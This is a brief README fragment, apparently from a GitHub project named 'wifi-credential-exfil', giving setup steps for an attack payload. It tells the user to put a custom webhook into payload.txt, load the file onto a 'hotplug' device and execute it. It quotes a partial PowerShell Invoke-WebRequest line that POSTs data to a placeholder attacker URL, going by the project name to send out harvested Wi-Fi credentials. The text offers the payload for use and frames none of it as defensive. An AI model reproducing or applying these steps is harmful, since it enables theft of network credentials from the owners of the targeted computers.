...
# 📄 Instructions
1. Replace `https://YOUR_LINK_HERE.com` in [payload.txt](https://github.com/cxdzc/wifi-credential-exfil/blob/main/payload.txt) with your custom webhook.

`...Invoke-WebRequest -Uri https://YOUR_LINK_HERE.com -Method Post...`

2. Upload [payload.txt](https://github.com/cxdzc/wifi-credential-exfil/blob/main/payload.txt) to your hotplug.
3. Execute the file.
